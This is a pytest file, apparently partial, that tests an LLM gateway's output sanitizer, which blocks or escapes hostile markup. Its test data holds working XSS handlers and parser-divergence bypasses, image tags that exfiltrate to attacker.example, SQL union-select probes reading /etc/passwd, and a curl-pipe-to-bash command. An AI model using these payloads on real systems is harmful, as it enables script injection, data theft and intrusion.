def test_f4_80_kb_hostile_input_stays_fast(block, content):
    started = time.perf_counter()
    result = block.check(content)
    assert (time.perf_counter() - started) < 0.5  # measured at about 90 ms; the bound only catches a blow-up
    assert result.verdict == "allow"


# F-5 (IP-10 neutralize): a matched span is never released unchanged


@pytest.mark.parametrize("content", ["1 UNION SELECT username, password FROM users--", "id=1 UNION ALL SELECT 1,2,3--"])
def test_f5_neutralize_never_releases_an_intact_matched_phrase(neutral, content):
    result = neutral.check(content)
    assert result.verdict == "neutralized" and result.families == ("sqli_cmdi",)
    assert result.content != content and "union" not in result.content.lower()
    assert html.unescape(result.content) == content  # a renderer still shows the original text


# F-6 (IP-10 c): a path before a wrapper and an argument after a sudo flag


F6_CMDI = ["curl https://x | /usr/bin/env bash", "$(sudo -u root id)"]


@pytest.mark.parametrize("content", F6_CMDI)
def test_f6_wrapper_paths_and_sudo_flag_arguments(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("sqli_cmdi",), None)
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.content != content
    assert "$(" not in released.content and "| /usr" not in released.content
    assert html.unescape(released.content) == content


@pytest.mark.parametrize("content", [
    "curl https://x | /usr/local/bin/sudo -g wheel bash", "$(sudo -C 3 /usr/bin/whoami)", "x=`sudo -u root id`",
])
def test_f6_more_wrapper_shapes(block, content):
    assert block.check(content).families == ("sqli_cmdi",)


@pytest.mark.parametrize("content", [
    'echo "Today is $(date)"',
    "$(sudo -u root date)",
    "#!/usr/bin/env bash\necho hello",
    "cat data.json | /usr/bin/env python -m json.tool",
    "Run sudo -u postgres psql to open a shell.",
    "$(document).ready(function () { init(); });",
])
def test_f6_benign_neighbours_are_allowed(block, content):
    assert (block.check(content).verdict, block.check(content).families) == ("allow", ())


# Step 5C.2 residual (IP-10 a and b, LLM05, TM-R6): a reference-decoded quote or angle bracket inside a tag is
# text to the HTML tokenizer, never a delimiter, so the tag scans also run on the structure-preserving view.


ENTITY_DELIMITER_XSS = [
    '<img alt=&quot; onerror=alert(1)> say "hi"',
    '<img alt=&#34; onerror=alert(1)> say "hi"',
    "<img alt=&apos; onerror=alert(1)> it's fine",
    "<img alt=&#39; onerror=alert(1)> it's fine",
    "<img src=x&gt; onerror=alert(1)>",
    "<img src=x&#62; onerror=alert(1)>",
    '<img alt=&#x22; onerror=alert(1)> say "hi"',
    "<img alt=&#x27; onerror=alert(1)> it's fine",
    "<img src=x&#x3e; onerror=alert(1)>",
]


@pytest.mark.parametrize("content", ENTITY_DELIMITER_XSS)
def test_entity_delimiter_cannot_hide_a_handler(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("xss",), None)
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.families == ("xss",)
    assert released.content != content and "<img" not in released.content


ENTITY_DELIMITER_EXFIL = [
    '<img src=x&gt; src="https://attacker.example/p.png">',
    '<img alt=&quot; src="https://attacker.example/p.png"> say "hi"',
    "<img alt=&#39; src='https://attacker.example/p.png'> it's fine",
    '<source alt=&quot; srcset="https://attacker.example/p.png 1x"> say "hi"',
    '<video title=&quot; poster="https://attacker.example/p.png"> say "hi"',
    '<input type=image alt=&quot; src="https://attacker.example/p.png"> say "hi"',
]


@pytest.mark.parametrize("content", ENTITY_DELIMITER_EXFIL)
def test_entity_delimiter_cannot_hide_an_external_image(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("image_exfil",), None)
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.content != content
    assert "attacker.example" not in released.content


def test_entity_delimiter_cannot_hide_a_javascript_uri_in_a_tag(block, neutral):
    content = '<a title=&quot; href="java&Tab;script:alert(1)">click</a> say "hi"'
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("xss",), None)
    assert "javascript_uri_in_tag" in {f.name for f in result.findings}
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.content != content
    assert "<a " not in released.content and "script:" not in html.unescape(released.content)


def test_structure_view_still_decodes_url_noise_and_scheme_references(block):
    # Only quotes and angle brackets are inert in the structure view; tab references stay decoded.
    assert block.check('<img alt=&quot; src=/&#9;/attacker.example/p.png> say "hi"').families == ("image_exfil",)
    assert block.check('<a title=&quot; href=java&#x09;script:alert(1)> say "hi"').families == ("xss",)


@pytest.mark.parametrize("content", [
    "&lt;script&gt;alert(1)&lt;/script&gt;",  # fully encoded tags are still caught by the decoded view
    "&lt;img src=x onerror=alert(1)&gt;",
])
def test_fully_encoded_tags_are_still_caught(block, neutral, content):
    assert (block.check(content).verdict, block.check(content).families) == ("block", ("xss",))
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.content != content


@pytest.mark.parametrize("content", [
    '<a title="say &quot;hi&quot;" href="/docs">docs</a>',
    "<a href=/docs title=it&#39;s>it's fine</a>",
    "<p>1 &lt; 2 &amp;&amp; 3 &gt; 2, the onerror attribute</p>",
    '<img alt="a &gt; b" src="/static/logo.png"> say "hi"',
    "Use &lt;img src=logo.png&gt; for the logo.",
])
def test_entity_delimiter_benign_neighbours_are_allowed(block, content):
    assert (block.check(content).verdict, block.check(content).families) == ("allow", ())


ENTITY_DELIMITER_HOSTILE = {
    "quot-flood": "<img alt=" + "&quot; " * 13_000,
    "quot-equals": "<a " + "&quot;=" * 13_000,
    "gt-tags": "<img src=x&gt; " * 5_000,
    "apos-spaces": "<img alt=&#39;" + " " * 80_000,
}


@pytest.mark.parametrize("content", list(ENTITY_DELIMITER_HOSTILE.values()), ids=list(ENTITY_DELIMITER_HOSTILE))
def test_structure_view_80_kb_hostile_input_stays_fast(block, content):
    started = time.perf_counter()
    block.check(content)
    assert (time.perf_counter() - started) < 0.5  # measured at 74 to 134 ms; the bound only catches a blow-up


# Step 5C.3: closure of the Step 5C.2 audit findings B-1 and N-1 (out_san_v3)


# B-1 (IP-10 a and b, LLM05, TM-R6): the WHATWG start-tag grammar. An unquoted value holds `=`, quotes and `<`; an
# attribute name may start with `=`; a reference-decoded `=` is not a delimiter.


B1_XSS = [
    # a) a stray `=` before a quote: the quote is inside an unquoted value or a name, so it opens nothing
    '<img src=x=" onerror=alert(1)//">',
    '<img src=x =" onerror=alert(1)//">',
    '<img src="a"=" onerror=alert(1)//">',
    "<img src=x=' onerror=alert(1)//'>",
    '<svg x=y=" onload=alert(1)//">',
    '<img src=x=" a=">" onerror=alert(1)//">',
    # b) `<` inside an unquoted value does not end the tag
    "<img src=x<1 onerror=alert(1)>",
    # c) a reference-decoded `=` is text inside an attribute name
    '<img alt&equals;" onerror=alert(1)//">',
    '<img alt&#61;" onerror=alert(1)//">',
]

B1_EXFIL = [
    "<img alt=a<b src=https://attacker.example/p.png>",
    '<img alt=a<1 src="https://attacker.example/p.png">',
    "<input type=image alt=a<b src=https://attacker.example/p.png>",
]


@pytest.mark.parametrize("content", B1_XSS)
def test_b1_whatwg_attribute_grammar_cannot_hide_a_handler(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("xss",), None)
    assert "event_handler" in {f.name for f in result.findings}
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.families == ("xss",)
    assert released.content != content
    assert "<img" not in released.content and "<svg" not in released.content  # no live tag carries the handler
    assert released.content.startswith(("&lt;img", "&lt;svg"))  # the span from the tag start to the handler


@pytest.mark.parametrize("content", B1_EXFIL)
def test_b1_lt_in_an_unquoted_value_cannot_hide_an_external_image(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("image_exfil",), None)
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.content != content
    assert "attacker.example" not in released.content


# The same grammar against the other ways a scanner can read a tag differently from the browser (found while
# closing B-1): `\s` splits a value at U+001C, NFKC turns U+00A0 into a space and U+FF1D into `=`, a reference
# can decode to a space, tab or `/`, and a tag the browser never sees (inside a comment or a textarea) can open a
# quote that would swallow a real tag after it.
B1_WHATWG_CONSISTENCY = [
    '<img a=b\x1cc=" onerror=alert(1)//">',
    '<img a=b\xa0c=" onerror=alert(1)//">',
    '<img alt＝" onerror=alert(1)//">',
    '<img a=b&#32;c=" onerror=alert(1)//">',
    '<img a=b&Tab;c=" onerror=alert(1)//">',
    '<img a&sol;="> x" onerror=alert(1)>',
    '<!-- <img x=" --> <img src=x onerror=alert(1)> " -->',
    '<textarea><img x="</textarea><svg/onload=alert(1)>"</textarea>',
    "<img/onerror=alert(1)>",
    '<img src="x"onerror=alert(1)>',
    '<img/src="x"/onerror=alert(1)>',
]


@pytest.mark.parametrize("content", B1_WHATWG_CONSISTENCY)
def test_b1_tokenizer_divergence_cannot_hide_a_handler(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("xss",), None)
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.content != content
    # Every matched tag-to-handler span is escaped; a decoy tag with no handler (inside a comment) may stay.
    assert all(content[f.start:f.end] not in released.content for f in result.findings)


@pytest.mark.parametrize("content", [
    "<a href=&Tab;javascript:alert(1)>x</a>",  # the URL parser strips a leading tab of the decoded value
    '<a title=x=" href=javascript:alert(1)//">x</a>',
])
def test_b1_javascript_uri_in_a_whatwg_value(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families) == ("block", ("xss",))
    released = neutral.check(content)
    assert released.verdict == "neutralized" and "javascript:" not in html.unescape(released.content)


def test_b1_reference_slashes_in_a_value_still_name_an_external_image(block, neutral):
    # The browser decodes references inside a value: `&sol;&sol;` is `//`, a protocol-relative URL.
    content = '<img alt=&quot; src=&sol;&sol;attacker.example/p.png> say "hi"'
    assert (block.check(content).verdict, block.check(content).families) == ("block", ("image_exfil",))
    assert "attacker.example" not in neutral.check(content).content


def test_b1_unquoted_value_swallows_a_slash_handler_as_the_browser_does(block):
    # WHATWG: `src` gets the unquoted value `x/onerror=alert(1)`, so this tag has no `onerror` attribute. No test
    # expected it to block before Step 5C.3; the quoted form and `<img/onerror=...>` block (B1_WHATWG_CONSISTENCY).
    content = "<img/src=x/onerror=alert(1)>"
    assert (block.check(content).verdict, block.check(content).families) == ("allow", ())


def test_b1_structure_view_makes_a_reference_equals_inert():
    content = "<img alt&equals;x &#61;y>"
    form, spans = matching_form(content)
    assert form == "<img alt=x =y>"
    assert structure_form(form, spans, content) == "<img alt�x �y>"
    assert structure_form(*matching_form("a＝b"), "a＝b") == "a�b"  # NFKC-derived
    assert structure_form(*matching_form("A=B"), "A=B") == "a=b"  # ASCII case folding is not a derivation


@pytest.mark.parametrize("content", [
    '<img alt="say onclick=x">',
    '<img alt="1 > 0" src="/static/logo.png">',
    "Use the onerror attribute only on image elements you control.",
    '<a title="x=y onload=z" href="/docs">docs</a>',
    "<img src=/static/a.png alt=a<b>",
    "<p class=note data-x=a=b>text</p>",
    "if (a<b && c>d) { onerror = report; }",
    "<img/src=logo.png/alt=x>",
])
def test_b1_benign_neighbours_are_allowed(block, content):
    assert (block.check(content).verdict, block.check(content).families) == ("allow", ())


B1_HOSTILE = {
    "names-lt": "<img a" * 13_000,  # each inner `<img` sits inside the previous attribute name
    "values-lt": "<img a=b" * 10_000,  # each inner `<img` sits inside an unquoted value
    "src-lt": "<img src=x<img src=x" * 4_000,
    "quote-parity": '<img a="<img a="' * 5_000,
    "space-names": "<img " + "a " * 40_000,
    "on-names": "<img onx=" * 9_000,
    "equals-names": "<img " + "=\" " * 26_000,
    "ref-equals": "<img alt&equals;\" " * 4_500,
    # Step 5C.4 B-2: a tag name has no cap and its end is checked after the match; a lookahead took about 4.0 s here
    "open-a-repeat": "<a" * 40_000,
}


@pytest.mark.parametrize("content", list(B1_HOSTILE.values()), ids=list(B1_HOSTILE))
def test_b1_80_kb_hostile_tags_stay_fast(block, neutral, content):
    """Every tag start is scanned, but the items after a boundary are tokenized once, so the scan stays linear."""
    for sanitizer in (block, neutral):
        started = time.perf_counter()
        sanitizer.check(content)
        assert (time.perf_counter() - started) < 0.5  # measured at 60 to 170 ms; the bound only catches a blow-up


# N-1 (TM-R2, IP-7, LLM10): the separator after `select` in union_select_probe is possessive


def test_n1_union_select_probe_is_linear_on_trailing_spaces():
    (probe,) = [p for p in PATTERNS if p.name == "union_select_probe"]
    form = matching_form("union select " + " " * 80_000)[0]
    started = time.perf_counter()
    assert probe.regex.search(form) is None
    assert (time.perf_counter() - started) < 0.05  # measured at about 3 ms (about 430 ms before the fix)


@pytest.mark.parametrize("content", [
    "1 UNION SELECT null, null--",
    "x' union all select @@version",
    "UNION ALL SELECT 1, version()",
    "union/**/select load_file('/etc/passwd')",
    "id=5 union select /**/ table_name from information_schema.tables",
])
def test_n1_union_select_probes_still_match(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families) == ("block", ("sqli_cmdi",))
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.content != content
    assert html.unescape(released.content) == content  # escaping only: a renderer shows the original text


# Step 5C.4: closure of the Step 5C.3 audit finding B-2 (out_san_v3)


# B-2 (IP-10 a, LLM05, TM-R6, TM-R2): a tag name is an ASCII letter followed by any characters but HTML whitespace,
# `/` and `>`, with no length cap. The old name (`[a-z][a-z0-9:-]{0,31}` followed by whitespace) let a custom
# element (`<x_y`), a dotted, accented, long or entity-laden name hide a live handler.
B2_XSS = {
    "underscore-autofocus": "<x_y autofocus tabindex=1 onfocus=alert(1)>",
    "underscore-cvauto": "<x_y oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>",
    "dot-name": "<x.y onmouseover=alert(1)>",
    "long-name": "<" + "a" * 40 + " onfocus=alert(1)>",
    "accent-name": "<xé onfocus=alert(1)>",
    "entity-name": "<p&amp& onload=alert(1)>",
    "hash-nul-name": "<a#\x00 onerror=alert(1)>",
}


@pytest.mark.parametrize("content", list(B2_XSS.values()), ids=list(B2_XSS))
def test_b2_any_whatwg_tag_name_cannot_hide_a_handler(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("xss",), None)
    assert "event_handler" in {f.name for f in result.findings}
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.families == ("xss",)
    assert released.content != content
    assert released.content.startswith("&lt;")  # the span starts at the tag start
    assert "<" not in released.content  # no live tag is left
    assert all(content[f.start:f.end] not in released.content for f in result.findings)  # no intact handler


@pytest.mark.parametrize(("content", "escaped_start"), [
    ("<x<x autofocus tabindex=1 onfocus=alert(1)>", "&lt;x&lt;x"),
    ("<a<a\fonerror=alert(1)>", "&lt;a&lt;a"),
])
def test_b2_nested_lt_in_a_tag_name_is_escaped_in_neutralize(block, neutral, content, escaped_start):
    # The tag name is `x<x` (resp. `a<a`); the escape span starts at the outer `<`, so the inner one is escaped too
    # and no live handler is left in the released text.
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("xss",), None)
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.families == ("xss",)
    assert released.content.startswith(escaped_start)
    assert "<" not in released.content  # no live tag opener is left, so the handler is inert text


def test_b2_img_lt_img_is_an_image_for_a_markdown_renderer(block, neutral):
    # WHATWG reads the tag name `img<img`, so a browser fetches nothing, but a Markdown renderer can output the
    # inner `<img ...>` as a live image (Step 5C.5 B-3), so the inner start is indexed too.
    content = "<img<img src=//attacker.example/p.png>"
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("image_exfil",), None)
    released = neutral.check(content)
    assert (released.verdict, released.families) == ("neutralized", ("image_exfil",))
    assert released.content != content and "attacker.example" not in released.content
    # The same URL on a real `img` still matches.
    assert block.check("<img src=//attacker.example/p.png>").families == ("image_exfil",)


# Step 5C.5: closure of the Step 5C.4 audit finding B-3 (out_san_v4)


# B-3 (IP-10 b, LLM05, TM-R6): a CommonMark renderer outputs `<x<img src=...>` as `&lt;x<img src=...>`, whose inner
# tag is a live image, so every `<` followed by a letter inside a tag name is also indexed as a tag start.
B3_INNER_IMAGES = {
    "x-img": "<x<img src=//attacker.example/p.png>",
    "x-input-image": "<x<input type=image src=https://attacker.example/p.png>",
    "p-image-href": "<p<image href=//attacker.example/p.png>",
    "x-source-srcset": "<x<source srcset=//attacker.example/p.png>",
    "x-video-poster": "<x<video poster=//attacker.example/p.png>",
    "img-img": "<img<img src=//attacker.example/p.png>",
}


@pytest.mark.parametrize("content", list(B3_INNER_IMAGES.values()), ids=list(B3_INNER_IMAGES))
def test_b3_inner_image_tag_starts_are_blocked_and_neutralized(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("image_exfil",), None)
    released = neutral.check(content)
    assert (released.verdict, released.families) == ("neutralized", ("image_exfil",))
    assert released.content != content
    assert "attacker.example" not in released.content  # the URL is removed
    assert all(content[f.start:f.end] not in released.content for f in result.findings)


def test_b3_inner_image_start_is_found_on_the_rendered_form(block, neutral):
    # What a CommonMark renderer outputs for the Markdown input above: the outer `<` is already escaped.
    content = "&lt;x<img src=//attacker.example/p.png>"
    result = block.check(content)
    assert (result.verdict, result.families) == ("block", ("image_exfil",))
    assert "attacker.example" not in neutral.check(content).content


def test_b3_a_long_inner_name_is_not_an_image_start(block):
    # The inner name is kept only up to the longest image element name; a longer one cannot be an image element.
    content = "<x<imgxxxxxxxxxxxxx src=//attacker.example/p.png>"
    assert (block.check(content).verdict, block.check(content).families) == ("allow", ())


@pytest.mark.parametrize("content", [
    "<x<b src=//attacker.example/p.png>",  # an inner tag that is not an image element
    "<x<a href=//attacker.example/p.png>",
    "<x<img src=logo.png>",  # a relative path
    "<x<img src=//cdn.example.com/p.png>",  # allowlisted below
])
def test_b3_inner_starts_of_other_tags_and_allowed_urls_stay_allowed(content):
    sanitizer = OutputSanitizer(image_allowlist=["cdn.example.com"])
    assert (sanitizer.check(content).verdict, sanitizer.check(content).families) == ("allow", ())


B3_HOSTILE = {
    "a-repeat-src": "<a" * 40_000 + " src=x",
    "img-repeat-src": "<img" * 20_000 + " src=//e.example/x",
}


@pytest.mark.parametrize("content", list(B3_HOSTILE.values()), ids=list(B3_HOSTILE))
def test_b3_inner_starts_stay_linear_in_both_modes(block, neutral, content):
    """Each inner start shares the boundary of the outer one, so the scan is one pass (well under 0.5 s)."""
    expected = "block" if "e.example" in content else "allow"
    for sanitizer in (block, neutral):
        started = time.perf_counter()
        result = sanitizer.check(content)
        assert (time.perf_counter() - started) < 0.5
        assert (result.verdict == "allow") == (expected == "allow")


@pytest.mark.parametrize("content", [
    "<x_y class=note>text</x_y>",
    "<x.y title=hello>",
    "<x_y>onfocus=alert(1)</x_y>",  # no attribute list: the handler text is element content
    "<a#>onerror=alert(1)",
    "<x_y data-note=\"onfocus=alert(1)\">",  # inside a quoted value
])
def test_b2_benign_custom_element_neighbours_are_allowed(block, content):
    assert (block.check(content).verdict, block.check(content).families) == ("allow", ())


def test_b2_open_a_repeat_runs_fast_in_both_modes(block, neutral):
    """A lookahead after the name was quadratic on `<a` repeated (about 4.0 s); the post-match filter is linear."""
    content = "<a" * 40_000
    for sanitizer in (block, neutral):
        started = time.perf_counter()
        result = sanitizer.check(content)
        assert (time.perf_counter() - started) < 0.5  # measured at about 60 ms
        assert result.verdict == "allow"


# Through the gateway (demo mode, the full-defense configuration)


def demo_app(tmp_path, sink, l4, reply: str, **overrides):
    fake = FakeGroq(reply=lambda body: (reply, None))
    values = dict(UPSTREAM_MODE="groq", GROQ_API_KEY=TEST_API_KEY, GATEWAY_MODE="demo")
    values.update(overrides)
    settings = make_settings(tmp_path, **values)
    return create_app(settings, sink, upstream=fake.client(), l4=l4), fake


def post(app, prompt: str = PROMPT, **kwargs) -> httpx.Response:
    async def go():
        async with app.router.lifespan_context(app):
            async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://t") as client:
                return await client.post("/v1/chat", json={"user_prompt": prompt}, **kwargs)

    return asyncio.run(go())


@pytest.mark.parametrize(("reply", "family"), [(XSS, "xss"), (EXFIL, "image_exfil"), (SQLI, "sqli_cmdi")])
def test_demo_block_mode_returns_the_uniform_503_and_logs_a_separate_record(tmp_path, l4_scanner, reply, family):
    sink = FakeSink()
    app, fake = demo_app(tmp_path, sink, l4_scanner, reply)
    response = post(app, headers={"X-Trial-ID": "demo-trial-1"})
    assert_uniform(response)
    (record,) = sink.records
    assert (record.outcome, record.blocked_by, record.egress_action, record.egress_variant) == (
        Outcome.EGRESS_SAVED, "L4", "blocked", "X2"
    )
    content_l4 = [r for r in record.layer_results if r.layer == "L4" and r.view == "content"]
    sanitizer_l4 = [r for r in record.layer_results if r.layer == "L4" and r.view == SANITIZER_VIEW]
    assert [r.verdict for r in content_l4] == ["allow"]  # the X2 verdict itself is unchanged
    assert [r.verdict for r in sanitizer_l4] == ["block"] and family in sanitizer_l4[0].error_message
    (row,) = sink.sanitizer_logs
    assert (row["verdict"], row["matched_families"], row["mode"], row["sanitizer_version"]) == (
        "block", (family,), "block", OUTPUT_SANITIZER_VERSION
    )
    assert row["trial_id"] == "demo-trial-1" and row["egress_variant"] == "X2" and row["gateway_mode"] == "demo"
    assert row["prompt_hash"] == record.prompt_hash and row["latency_ms"] >= 0.0
    assert reply not in json.dumps(row) and len(fake.chat_requests) == 1


def test_demo_neutralize_mode_releases_escaped_content(tmp_path, l4_scanner):
    sink = FakeSink()
    app, _ = demo_app(tmp_path, sink, l4_scanner, XSS, OUTPUT_SANITIZER_MODE="neutralize")
    response = post(app)
    assert response.status_code == 200
    content = response.json()["content"]
    assert set(response.json()) == {"content"} and "<img" not in content and "&lt;img" in content
    (record,) = sink.records
    assert (record.outcome, record.egress_action, record.blocked_by) == (Outcome.EGRESS_SAVED, "masked", None)
    assert [r["verdict"] for r in sink.sanitizer_logs] == ["neutralized"]


def test_demo_clean_content_is_released_unchanged_and_logged_as_allow(tmp_path, l4_scanner):
    sink = FakeSink()
    app, _ = demo_app(tmp_path, sink, l4_scanner, "Paris is the capital of France.")
    response = post(app)
    assert response.json() == {"content": "Paris is the capital of France."}
    (record,) = sink.records
    assert record.outcome == Outcome.SUCCESS and record.egress_action == "none"
    assert [(r["verdict"], r["matched_families"]) for r in sink.sanitizer_logs] == [("allow", ())]


def test_production_default_runs_no_sanitizer(tmp_path, l4_scanner):
    sink = FakeSink()
    app, _ = demo_app(tmp_path, sink, l4_scanner, XSS, GATEWAY_MODE="production")
    response = post(app)
    assert response.json() == {"content": XSS}  # production leaves the flag off (the E1-compatible default)
    assert sink.sanitizer_logs == [] and not any(r.view == SANITIZER_VIEW for r in sink.records[0].layer_results)


def test_an_x2_block_wins_before_the_sanitizer_runs(tmp_path, l4_scanner):
    """The egress-variant scan runs first: a canary leak is an L4 block and the sanitizer never sees the text."""
    sink = FakeSink()
    fake = FakeGroq(reply=lambda body: (f"<script>{system_secret(body, 'CANARY')}", None))
    settings = make_settings(tmp_path, UPSTREAM_MODE="groq", GROQ_API_KEY=TEST_API_KEY, GATEWAY_MODE="demo")
    app = create_app(settings, sink, upstream=fake.client(), l4=l4_scanner)
    assert_uniform(post(app))
    (record,) = sink.records
    assert (record.outcome, record.blocked_by) == (Outcome.EGRESS_SAVED, "L4")
    assert sink.sanitizer_logs == []


def test_sanitizer_runs_on_the_masked_x2_content(tmp_path, l4_scanner):
    """Masking happens first; the placeholders it writes (`<US_SSN>`) are not markup the sanitizer flags."""
    sink = FakeSink()
    fake = FakeGroq(reply=lambda body: (f"SSN {system_secret(body, 'US_SSN')}", None))
    settings = make_settings(tmp_path, UPSTREAM_MODE="groq", GROQ_API_KEY=TEST_API_KEY, GATEWAY_MODE="demo")
    app = create_app(settings, sink, upstream=fake.client(), l4=l4_scanner)
    response = post(app)
    assert response.json() == {"content": "SSN <US_SSN>"}
    assert sink.records[0].egress_action == "masked" and sink.sanitizer_logs[0]["verdict"] == "allow"


# Fail closed (TM-R4): a timeout or an exception is the uniform 503 in either mode


class ExplodingSanitizer(OutputSanitizer):
    def check(self, content: str):
        raise RuntimeError("pattern engine exploded")


class SlowSanitizer(OutputSanitizer):
    def check(self, content: str):
        time.sleep(0.4)  # above the 150 ms L4 budget plus the 50 ms hang grace
        return super().check(content)


@pytest.mark.parametrize("mode", ["block", "neutralize"])
def test_a_sanitizer_exception_fails_closed(tmp_path, l4_scanner, mode):
    sink = FakeSink()
    settings = make_settings(tmp_path, UPSTREAM_MODE="groq", GROQ_API_KEY=TEST_API_KEY, GATEWAY_MODE="demo",
                             OUTPUT_SANITIZER_MODE=mode)
    app = create_app(settings, sink, upstream=FakeGroq().client(), l4=l4_scanner,
                     output_sanitizer=ExplodingSanitizer(mode=mode))
    assert_uniform(post(app))
    (record,) = sink.records
    assert (record.outcome, record.blocked_by, record.target_called, record.egress_action) == (
        Outcome.ERROR, "internal_error", True, "none"
    )
    assert [r.verdict for r in record.layer_results if r.view == SANITIZER_VIEW] == ["error"]
    (row,) = sink.sanitizer_logs
    assert row["verdict"] == "error" and row["matched_families"] == () and "RuntimeError" in row["error_message"]


@pytest.mark.parametrize("mode", ["block", "neutralize"])
def test_a_sanitizer_timeout_fails_closed(tmp_path, l4_scanner, mode):
    sink = FakeSink()
    settings = make_settings(tmp_path, UPSTREAM_MODE="groq", GROQ_API_KEY=TEST_API_KEY, GATEWAY_MODE="demo",
                             OUTPUT_SANITIZER_MODE=mode)
    app = create_app(settings, sink, upstream=FakeGroq().client(), l4=l4_scanner, output_sanitizer=SlowSanitizer(mode=mode))
    assert_uniform(post(app))
    (record,) = sink.records
    assert (record.outcome, record.blocked_by) == (Outcome.ERROR, "timeout")
    assert [r["verdict"] for r in sink.sanitizer_logs] == ["timeout"]


class _SpentL4:
    """An L4 whose egress scan reports the whole L4 budget as spent (the sanitizer shares that budget, TM-R2)."""

    def __init__(self, real: L4EgressScanner) -> None:
        self.real = real
        self.version = real.version

    def scan(self, raw, manifest, variant):
        decision = self.real.scan(raw, manifest, variant)
        return dataclasses.replace(decision, latency_ms=150.0)


def test_the_sanitizer_shares_the_l4_budget(tmp_path, l4_scanner):
    sink = FakeSink()
    called: list[str] = []

    class Spy(OutputSanitizer):
        def check(self, content: str):
            called.append(content)
            return super().check(content)

    settings = make_settings(tmp_path, UPSTREAM_MODE="groq", GROQ_API_KEY=TEST_API_KEY, GATEWAY_MODE="demo",
                             CACHE_ENABLED=False)
    app = create_app(settings, sink, upstream=FakeGroq().client(), l4=_SpentL4(l4_scanner), output_sanitizer=Spy())
    assert_uniform(post(app))
    assert called == []  # nothing left of the 150 ms budget, so it never ran and the request failed closed
    assert (sink.records[0].outcome, sink.records[0].blocked_by) == (Outcome.ERROR, "timeout")


# IP-5 and IP-10: the egress cache holds only the X0 to X3 decision


def _egress_rows(path) -> list[tuple[str, str, str]]:
    conn = sqlite3.connect(path)
    try:
        return conn.execute("SELECT cache_key, l4_version, payload FROM egress_verdicts ORDER BY cache_key").fetchall()
    finally:
        conn.close()


@pytest.mark.parametrize("variant", ["X1", "X2", "X3"])
@pytest.mark.parametrize("first_on", [True, False], ids=["on-then-off", "off-then-on"])
def test_toggling_the_flag_never_alters_cached_egress_rows(tmp_path, l4_scanner, monkeypatch, variant, first_on):
    reply = f"{XSS}\n{EXFIL}"
    fake = FakeGroq(reply=lambda body: (reply, None))
    settings = make_settings(
        tmp_path, UPSTREAM_MODE="groq", GROQ_API_KEY=TEST_API_KEY, ENABLE_OUTPUT_SANITIZER=True,
        OUTPUT_SANITIZER_MODE="neutralize", EGRESS_VARIANT=variant,
    )
    l4 = L4EgressScanner(embedder=FakeEmbedder()) if variant == "X3" else l4_scanner
    app = create_app(settings, FakeSink(), upstream=fake.client(), l4=l4)
    puts: list[tuple[str, str, dict[str, Any]]] = []

    async def go():
        async with app.router.lifespan_context(app):
            on = app.state.runtime
            off = dataclasses.replace(on, output_sanitizer=None)
            real_put = on.cache.put_egress
            monkeypatch.setattr(on.cache, "put_egress", lambda k, v, p: (puts.append((k, v, dict(p))), real_put(k, v, p))[1])
            first, second = (on, off) if first_on else (off, on)
            a = await run_chat(first, GatewayRequest(user_prompt=PROMPT))
            on.cache.flush()
            rows_a = _egress_rows(settings.CACHE_DB_PATH)
            b = await run_chat(second, GatewayRequest(user_prompt=PROMPT))
            on.cache.flush()
            rows_b = _egress_rows(settings.CACHE_DB_PATH)
            raw = await on.cache.get_response(next(iter(_response_keys(settings.CACHE_DB_PATH))))
            direct = l4.scan(raw, on.prompt.manifest, variant).to_cache()
            return a, b, rows_a, rows_b, raw, direct

    a, b, rows_a, rows_b, raw, direct = asyncio.run(go())
    sanitized, plain = (a, b) if first_on else (b, a)
    assert rows_a == rows_b and len(rows_a) == 1  # the second run replayed the row; nothing was rewritten
    assert len(puts) == 1  # one put_egress, for the X-variant decision only
    (key, _, payload) = puts[0]
    cached = json.loads(rows_a[0][2])
    assert payload["content"] == cached["content"] == direct["content"] == reply  # never the neutralized text
    assert (cached["variant"], cached["verdict"], cached["action"]) == (variant, "allow", "none")
    assert {k: v for k, v in cached.items() if k != "latency_ms"} == {k: v for k, v in direct.items() if k != "latency_ms"}
    assert plain.content == reply and sanitized.content != reply and "attacker.example" not in sanitized.content
    assert sanitized.sanitizer_log is not None and plain.sanitizer_log is None
    assert sanitized.sanitizer_log.response_hash == raw_response_hash(raw)
    l4_content = lambda r: [x.model_dump(exclude={"latency_ms"}) for x in r.layer_results if x.view == "content"]  # noqa: E731
    assert l4_content(sanitized) == l4_content(plain)  # the X-variant verdict is identical either way


def _response_keys(path) -> list[str]:
    conn = sqlite3.connect(path)
    try:
        return [row[0] for row in conn.execute("SELECT cache_key FROM target_responses")]
    finally:
        conn.close()


def test_output_sanitizer_rows_reach_sqlite_through_the_single_writer(tmp_path, l4_scanner):
    settings = make_settings(tmp_path, UPSTREAM_MODE="groq", GROQ_API_KEY=TEST_API_KEY, GATEWAY_MODE="demo")
